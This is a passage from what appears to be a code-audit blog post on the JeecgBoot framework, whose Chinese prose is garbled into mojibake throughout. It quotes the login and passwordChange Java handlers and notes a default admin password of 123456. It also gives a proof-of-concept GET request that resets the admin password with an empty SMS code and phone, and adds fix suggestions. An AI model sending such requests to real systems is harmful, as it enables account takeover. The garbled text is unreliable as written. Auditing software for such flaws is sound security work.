</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="n">result</span><span class="p">.</span><span class="na">setCode</span><span class="p">(</span><span class="n">HttpStatus</span><span class="p">.</span><span class="na">PRECONDITION_FAILED</span><span class="p">.</span><span class="na">value</span><span class="p">());</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="k">return</span><span class="w"> </span><span class="n">result</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//update-end-author:taoyan date:20190828 for:æ ¡éªŒéªŒè¯ç   </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//1. æ ¡éªŒç”¨æˆ·æ˜¯å¦æœ‰æ•ˆ  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//update-begin-author:wangshuai date:20200601 for: ç™»å½•ä»£ç éªŒè¯ç”¨æˆ·æ˜¯å¦æ³¨é”€bugï¼Œifæ¡ä»¶æ°¸è¿œä¸ºfalse  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">LambdaQueryWrapper</span><span class="o">&lt;</span><span class="n">SysUser</span><span class="o">&gt;</span><span class="w"> </span><span class="n">queryWrapper</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">LambdaQueryWrapper</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">queryWrapper</span><span class="p">.</span><span class="na">eq</span><span class="p">(</span><span class="n">SysUser</span><span class="p">::</span><span class="n">getUsername</span><span class="p">,</span><span class="n">username</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">SysUser</span><span class="w"> </span><span class="n">sysUser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sysUserService</span><span class="p">.</span><span class="na">getOne</span><span class="p">(</span><span class="n">queryWrapper</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//update-end-author:wangshuai date:20200601 for: ç™»å½•ä»£ç éªŒè¯ç”¨æˆ·æ˜¯å¦æ³¨é”€bugï¼Œifæ¡ä»¶æ°¸è¿œä¸ºfalse  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sysUserService</span><span class="p">.</span><span class="na">checkUserIsEffective</span><span class="p">(</span><span class="n">sysUser</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">result</span><span class="p">.</span><span class="na">isSuccess</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="k">return</span><span class="w"> </span><span class="n">result</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//2. æ ¡éªŒç”¨æˆ·åæˆ–å¯†ç æ˜¯å¦æ­£ç¡®  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">userpassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">PasswordUtil</span><span class="p">.</span><span class="na">encrypt</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="n">sysUser</span><span class="p">.</span><span class="na">getSalt</span><span class="p">());</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">syspassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sysUser</span><span class="p">.</span><span class="na">getPassword</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">syspassword</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">userpassword</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="n">result</span><span class="p">.</span><span class="na">error500</span><span class="p">(</span><span class="s">&#34;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="k">return</span><span class="w"> </span><span class="n">result</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">            
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//ç”¨æˆ·ç™»å½•ä¿¡æ¯  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">userInfo</span><span class="p">(</span><span class="n">sysUser</span><span class="p">,</span><span class="w"> </span><span class="n">result</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//update-begin--Author:liusq  Date:20210126  forï¼šç™»å½•æˆåŠŸï¼Œåˆ é™¤redisä¸­çš„éªŒè¯ç   </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">redisUtil</span><span class="p">.</span><span class="na">del</span><span class="p">(</span><span class="n">realKey</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//update-begin--Author:liusq  Date:20210126  forï¼šç™»å½•æˆåŠŸï¼Œåˆ é™¤redisä¸­çš„éªŒè¯ç   </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">LoginUser</span><span class="w"> </span><span class="n">loginUser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">LoginUser</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">BeanUtils</span><span class="p">.</span><span class="na">copyProperties</span><span class="p">(</span><span class="n">sysUser</span><span class="p">,</span><span class="w"> </span><span class="n">loginUser</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">baseCommonService</span><span class="p">.</span><span class="na">addLog</span><span class="p">(</span><span class="s">&#34;ç”¨æˆ·å: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;,ç™»å½•æˆåŠŸï¼&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">CommonConstant</span><span class="p">.</span><span class="na">LOG_TYPE_1</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="n">loginUser</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="c1">//update-end--Author:wangshuai  Date:20200714  forï¼šç™»å½•æ—¥å¿—æ²¡æœ‰è®°å½•äººå‘˜  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">result</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ‘ä»¬å¾ˆå®¹æ˜“å°±èƒ½æ‰¾åˆ°è¿™ä¸€æ®µä»£ç ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯å¾€Sysuserå®ä½“ç±»é‡Œé¢æ‰¾çš„ï¼Œå¤§æ¦‚ç‡å°±æ˜¯sys_userçš„è¡¨ï¼Œæˆ‘ä»¬è¿›åˆ°å¯¹åº”çš„ç±»ä¸­æŸ¥çœ‹ï¼Œæ²¡æœ‰å¤šä½™çš„æ³¨è§£ä¸“é—¨è¯´æ˜ä¹¦å“ªä¸ªè¡¨ï¼Œæ‰€ä»¥ç¡®å®šå°±æ˜¯è¿™ä¸ªè¡¨ï¼Œå› ä¸ºæ˜¯æœ¬åœ°ï¼Œè¿˜æ˜¯çœ‹ä¸€ä¸‹å§ã€‚
<img src="/images/JeecgBoot/4.png"
	
	
	
	loading="lazy"
	
		alt="ç¤ºä¾‹"
	
	
>
å¾ˆæ˜æ˜¾å¯ä»¥çœ‹åˆ°è´¦å·å¯†ç çš„å­˜å‚¨å•Šï¼Œè¿™é‡Œå°±ä¸æµ‹è¯•äº†ï¼Œè‚¯å®šæ˜¯adminçš„å¯†ç è®¾æˆäº†123456äº†ã€‚è¿™é‡Œå°±ç›´æ¥è¯´ä¸€ä¸ªå¼±å£ä»¤å°±è¿›å»äº†ã€‚</p>
<h2 id="ä¿®æ”¹å»ºè®®">ä¿®æ”¹å»ºè®®
</h2><p>å°†ç®¡ç†å‘˜è´¦å·ä¿®æ”¹ä¸ºéadminç­‰å®¹æ˜“è¡¨æ˜æƒé™çš„è´¦å·åï¼Œå¯†ç ä¹Ÿè¦ä¿®æ”¹ä¸ºä¸ä¼šè¢«çˆ†ç ´å‡ºæ¥çš„ç‹¬ç‰¹å¯†ç ï¼Œèƒ½å¤Ÿæœ‰æ•ˆå‡å°‘å¼±å£ä»¤ç™»å½•çš„æƒ…å†µã€‚</p>
<h1 id="ä»»æ„ç”¨æˆ·å¯†ç é‡ç½®">ä»»æ„ç”¨æˆ·å¯†ç é‡ç½®
</h1><p>ç¬¬äºŒä¸ªæ¼æ´å‡ºç°åœ¨ä¿®æ”¹å¯†ç çš„ä½ç½®ï¼Œè™½ç„¶æ–‡ç« é‡Œç›´æ¥ç»™äº†æˆ‘ä»¬ä»£ç çš„ä½ç½®ï¼Œæˆ‘ä»¬æŒ‰ç…§æ­£å¸¸å®¡è®¡æµç¨‹ï¼Œç¡®å®šæ¼æ´å­˜åœ¨ç‚¹å…ˆï¼Œç›´æ¥æœç´¢è¿™ä¸ªæ¥å£ã€‚</p>
<h2 id="passwordchangeæ¥å£">passwordChangeæ¥å£
</h2><p>æˆ‘ä»¬å®¡è®¡åˆ°è¿™ä¸ªä»£ç çš„æ—¶å€™å‘ç°å­˜åœ¨æ¼æ´æƒ…å†µï¼Œå…ˆå¤åˆ¶ä»£ç ä¸‹æ¥ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@GetMapping</span><span class="p">(</span><span class="s">&#34;/passwordChange&#34;</span><span class="p">)</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">Result</span><span class="o">&lt;</span><span class="n">SysUser</span><span class="o">&gt;</span><span class="w"> </span><span class="nf">passwordChange</span><span class="p">(</span><span class="nd">@RequestParam</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s">&#34;username&#34;</span><span class="p">)</span><span class="n">String</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">                              </span><span class="nd">@RequestParam</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s">&#34;password&#34;</span><span class="p">)</span><span class="n">String</span><span class="w"> </span><span class="n">password</span><span class="p">,</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">                                     </span><span class="nd">@RequestParam</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s">&#34;smscode&#34;</span><span class="p">)</span><span class="n">String</span><span class="w"> </span><span class="n">smscode</span><span class="p">,</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">                                     </span><span class="nd">@RequestParam</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s">&#34;phone&#34;</span><span class="p">)</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">phone</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="n">Result</span><span class="o">&lt;</span><span class="n">SysUser</span><span class="o">&gt;</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Result</span><span class="o">&lt;</span><span class="n">SysUser</span><span class="o">&gt;</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="k">if</span><span class="p">(</span><span class="n">oConvertUtils</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">(</span><span class="n">username</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">oConvertUtils</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">(</span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">oConvertUtils</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">(</span><span class="n">smscode</span><span class="p">)</span><span class="w">  </span><span class="o">||</span><span class="w"> </span><span class="n">oConvertUtils</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">(</span><span class="n">phone</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">           </span><span class="n">result</span><span class="p">.</span><span class="na">setMessage</span><span class="p">(</span><span class="s">&#34;é‡ç½®å¯†ç å¤±è´¥ï¼&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">           </span><span class="n">result</span><span class="p">.</span><span class="na">setSuccess</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">           </span><span class="k">return</span><span class="w"> </span><span class="n">result</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="n">SysUser</span><span class="w"> </span><span class="n">sysUser</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">SysUser</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="n">Object</span><span class="w"> </span><span class="n">object</span><span class="o">=</span><span class="w"> </span><span class="n">redisUtil</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">phone</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="k">if</span><span class="p">(</span><span class="kc">null</span><span class="o">==</span><span class="n">object</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">result</span><span class="p">.</span><span class="na">setMessage</span><span class="p">(</span><span class="s">&#34;çŸ­ä¿¡éªŒè¯ç å¤±æ•ˆï¼&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">           </span><span class="n">result</span><span class="p">.</span><span class="na">setSuccess</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">           </span><span class="k">return</span><span class="w"> </span><span class="n">result</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">smscode</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">object</span><span class="p">.</span><span class="na">toString</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">result</span><span class="p">.</span><span class="na">setMessage</span><span class="p">(</span><span class="s">&#34;çŸ­ä¿¡éªŒè¯ç ä¸åŒ¹é…ï¼&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">           </span><span class="n">result</span><span class="p">.</span><span class="na">setSuccess</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">           </span><span class="k">return</span><span class="w"> </span><span class="n">result</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="n">sysUser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">sysUserService</span><span class="p">.</span><span class="na">getOne</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">LambdaQueryWrapper</span><span class="o">&lt;</span><span class="n">SysUser</span><span class="o">&gt;</span><span class="p">().</span><span class="na">eq</span><span class="p">(</span><span class="n">SysUser</span><span class="p">::</span><span class="n">getUsername</span><span class="p">,</span><span class="n">username</span><span class="p">).</span><span class="na">eq</span><span class="p">(</span><span class="n">SysUser</span><span class="p">::</span><span class="n">getPhone</span><span class="p">,</span><span class="n">phone</span><span class="p">));</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">sysUser</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">           </span><span class="n">result</span><span class="p">.</span><span class="na">setMessage</span><span class="p">(</span><span class="s">&#34;æœªæ‰¾åˆ°ç”¨æˆ·ï¼&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">           </span><span class="n">result</span><span class="p">.</span><span class="na">setSuccess</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">           </span><span class="k">return</span><span class="w"> </span><span class="n">result</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">           </span><span class="n">String</span><span class="w"> </span><span class="n">salt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">oConvertUtils</span><span class="p">.</span><span class="na">randomGen</span><span class="p">(</span><span class="n">8</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">           </span><span class="n">sysUser</span><span class="p">.</span><span class="na">setSalt</span><span class="p">(</span><span class="n">salt</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">           </span><span class="n">String</span><span class="w"> </span><span class="n">passwordEncode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">PasswordUtil</span><span class="p">.</span><span class="na">encrypt</span><span class="p">(</span><span class="n">sysUser</span><span class="p">.</span><span class="na">getUsername</span><span class="p">(),</span><span class="w"> </span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="n">salt</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">           </span><span class="n">sysUser</span><span class="p">.</span><span class="na">setPassword</span><span class="p">(</span><span class="n">passwordEncode</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">           </span><span class="k">this</span><span class="p">.</span><span class="na">sysUserService</span><span class="p">.</span><span class="na">updateById</span><span class="p">(</span><span class="n">sysUser</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">           </span><span class="c1">//update-begin---author:wangshuai ---date:20220316  forï¼š[VUEN-234]å¯†ç é‡ç½®æ·»åŠ æ•æ„Ÿæ—¥å¿—------------  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">           </span><span class="n">baseCommonService</span><span class="p">.</span><span class="na">addLog</span><span class="p">(</span><span class="s">&#34;é‡ç½® &#34;</span><span class="o">+</span><span class="n">username</span><span class="o">+</span><span class="s">&#34; çš„å¯†ç ï¼Œæ“ä½œäººï¼š &#34;</span><span class="w"> </span><span class="o">+</span><span class="n">sysUser</span><span class="p">.</span><span class="na">getUsername</span><span class="p">()</span><span class="w"> </span><span class="p">,</span><span class="n">CommonConstant</span><span class="p">.</span><span class="na">LOG_TYPE_2</span><span class="p">,</span><span class="w"> </span><span class="n">2</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">           </span><span class="c1">//update-end---author:wangshuai ---date:20220316  forï¼š[VUEN-234]å¯†ç é‡ç½®æ·»åŠ æ•æ„Ÿæ—¥å¿—------------  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">           </span><span class="n">result</span><span class="p">.</span><span class="na">setSuccess</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">           </span><span class="n">result</span><span class="p">.</span><span class="na">setMessage</span><span class="p">(</span><span class="s">&#34;å¯†ç é‡ç½®å®Œæˆï¼&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">           </span><span class="k">return</span><span class="w"> </span><span class="n">result</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œçœ‹ä¼¼å¾ˆå®‰å…¨ï¼Œä½†æ˜¯å­˜åœ¨è‡´å‘½çš„æ¼æ´ï¼Œä½†æ˜¯è²Œä¼¼æ˜¯ä¸‹è½½çš„è¿™ä¸ªå·²ç»ä¿®æ”¹äº†ï¼Ÿä½†æ˜¯æˆ‘æŸ¥çš„æ—¶å€™çœ‹åˆ°äº†è¿™ä¸ªç‰ˆæœ¬çš„è¿˜æ˜¯æœ‰è¿™ä¸ªä»»æ„ç”¨æˆ·å¯†ç ä¿®æ”¹çš„æ¼æ´çš„ã€‚å…ˆæ”¾ä¸€ä¸‹ï¼Œç­‰ä¸‹å†çœ‹çœ‹ã€‚
æ„Ÿè§‰æ˜¯è¿™ä¸ªåœ°æ–¹çš„æ¥å£å·²ç»è¢«ä¿®å¤äº†ï¼Œçœ‹äº†ä¸€ä¸‹ä¹‹å‰çš„pocï¼Œå‘ç°éƒ½æ˜¯å°†smscodeå’Œphoneè®¾ä¸ºç©ºé€šè¿‡çš„ï¼Œä¸‹é¢æ˜¯æ‰¾åˆ°çš„ä¸€ä¸ªpocã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /jeecg-boot/sys/user/passwordChange?username=admin&amp;password=admin&amp;smscode=&amp;phone= HTTP/1.1  
</span></span><span class="line"><span class="cl">Host:Â   
</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0  
</span></span><span class="line"><span class="cl">Accept: */*  
</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate, br  
</span></span><span class="line"><span class="cl">Connection: keep-alive
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä½†æ˜¯å¾ˆæ˜æ˜¾ä»£ç ä¸­åŠ äº†isEmptyæ–¹æ³•çš„å¤„ç†ï¼Œå»çœ‹äº†ä¸€ä¸‹æ˜¯å¯¹è¿™ç§æƒ…å†µè¿›è¡Œäº†å¤„ç†çš„ï¼Œåº”è¯¥æ˜¯ä¸‹è½½çš„è¿™ä¸ªå·²ç»ä¿®å¤è¿‡äº†ï¼Œè™½ç„¶æŸ¥çš„æ—¶å€™æˆ‘è¿™ä¸ªç‰ˆæœ¬æ˜¯æœ‰é—®é¢˜çš„ã€‚å¯èƒ½ä¸‹çš„ä¸æ˜¯å®˜æ–¹çš„å§ã€‚æˆ‘æœ¬åœ°ä¹Ÿè¯•äº†ï¼Œç¡®å®æ˜¯é€šè¿‡ä¸äº†çš„ï¼Œæ„Ÿè§‰æ˜¯è€ç‰ˆæœ¬æ¼æ´ã€‚</p>
<h2 id="ä¿®å¤å»ºè®®">ä¿®å¤å»ºè®®
</h2><p>è¿™æ®µä»£ç æœ€ä¸¥é‡çš„é—®é¢˜å°±åœ¨äºç¬¬ä¸€è¡Œï¼Œ<code>@GetMapping(&quot;/passwordChange&quot;)</code>ï¼Œè¿™è¡Œå¯¼è‡´äº†å®ƒå¯ä»¥è¢«ç½‘ä¸Šä»»æ„ç”¨æˆ·è¿›è¡Œè®¿é—®å’Œå‘é€è¯·æ±‚ï¼Œå¾ˆæ¶å¿ƒã€‚å»ºè®®çš„æ–¹æ³•æ˜¯å°†GETè¯·æ±‚æ”¹å˜æˆPOSTè¯·æ±‚æˆ–è€…PUTè¯·æ±‚ï¼Œä¸å®¹æ˜“æ³„éœ²å‡ºè¿™ä¸ªå‚æ•°ï¼Œæˆ–è€…å†åŠ ä¸Šä¸€äº›ç¼–ç ï¼Œé˜²æ­¢è¢«æŠ“åŒ…ä¹‹åå‘ç°è¿™ä¸ªæ¥å£çš„å­˜åœ¨ã€‚</p>
<h1 id="ä¿¡æ¯æ³„éœ²æ¼æ´">ä¿¡æ¯æ³„éœ²æ¼æ´
</h1><p>ç¬¬ä¸‰ä¸ªæ¼æ´æ˜¯æœ‰å…³ä¿¡æ¯æ³„éœ²çš„æ¼æ´çš„ï¼Œè¿™é‡Œçœ‹åˆ°äº†ç‰ˆæœ¬æ˜¯åœ¨2.4.5ä¹‹å‰ï¼Œç‰ˆæœ¬æœ‰äº›å¤ªè€äº†ï¼Œæˆ‘è¿™é‡Œä¹Ÿæ²¡æœ‰å»ä¸‹è½½äº†ï¼Œç›´æ¥çœ‹çœ‹å½“å‰ç‰ˆæœ¬ä¸­å¯èƒ½ä¿®å¤çš„åœ°æ–¹å§ã€‚</p>
<h2 id="querysysuseræ¥å£">querySysUseræ¥å£
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//  /**  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//   * æ ¹æ®ç”¨æˆ·åæˆ–æ‰‹æœºå·æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//   * @param  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//   * @return  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//   */  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//  @GetMapping(&#34;/querySysUser&#34;)  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//  public Result&lt;Map&lt;String, Object&gt;&gt; querySysUser(SysUser sysUser) {  </span><span class="w">
